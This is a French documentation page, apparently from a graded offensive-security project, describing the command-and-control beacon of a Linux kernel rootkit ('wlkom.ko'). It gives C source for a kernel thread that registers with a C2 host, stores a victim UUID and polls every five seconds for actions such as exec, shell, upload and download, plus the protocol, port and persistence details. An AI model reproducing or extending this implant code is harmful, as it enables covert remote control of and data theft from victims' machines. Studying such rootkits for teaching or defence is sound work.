---
title: Connexion & Polling
description: Le rootkit s'enregistre auprès du C2 au chargement et démarre un thread noyau qui interroge les actions toutes les 5 secondes.
---

**Obligatoire · 3 pts**

Le rootkit s'enregistre auprès du C2 au chargement et démarre un thread noyau qui interroge les actions toutes les 5 secondes.

## Fonctionnement

Quand `insmod wlkom.ko c2_host=<IP>` est exécuté, `c2_init()` est appelée. Elle vérifie d'abord si un fichier UUID existe déjà dans `/rootkit/uuid`. Sinon, elle envoie `GET /register` au C2, reçoit un UUID frais et le sauvegarde. Elle démarre ensuite un **thread noyau** (`kthread`) qui boucle indéfiniment, interrogeant `GET /api/<uuid>/action` toutes les 5 secondes.

Le serveur C2 répond avec `HTTP 204` (pas de contenu) quand il n'y a rien à faire, ou avec la chaîne d'action (ex. `exec:ls -la`) en texte brut avec `HTTP 200`. Toute communication utilise **HTTP/1.0** — une connexion TCP par requête, fermée immédiatement après.

## Détails clés

| Propriété | Valeur |
|-----------|--------|
| Protocole | HTTP/1.0 sur TCP |
| Port C2 | 5000 |
| Intervalle de polling | 5 secondes |
| Stockage UUID | `/rootkit/uuid` |
| Thread | `kthread_run()` |
| Réponse sans action | HTTP 204 |

## Implémentation

```c
// rootkit/src/c2.c

int c2_init(void) {
    ensure_rootkit_dir();
    resolve_host(c2_host, &c2_addr);

    // Réutiliser l'UUID existant si déjà enregistré
    if (read_file(UUID_FILE, c2_uuid, UUID_LEN) < 36)
        do_register();       // GET /register → sauvegarder UUID

    // Démarrer le kthread de polling
    c2_task = kthread_run(c2_poll_fn, NULL, "c2_poll");
    return 0;
}

static int c2_poll_fn(void *data) {
    while (!kthread_should_stop()) {
        char action[256] = {0};
        int  status = http_get_action(c2_uuid, action, sizeof(action));

        if (status == 200 && action[0])
            handle_action(action);   // exec:... / shell:... / upload:... / download:...

        ssleep(5);   // attendre 5 secondes avant le prochain poll
    }
    return 0;
}
```

:::note[Persistance de l'UUID]
L'UUID est sauvegardé dans `/rootkit/uuid` au premier enregistrement. Aux chargements suivants (`insmod`), le fichier est lu et l'étape d'enregistrement C2 est ignorée. Cela garantit que la même machine victime conserve la même identité à travers les rechargements du rootkit.
:::
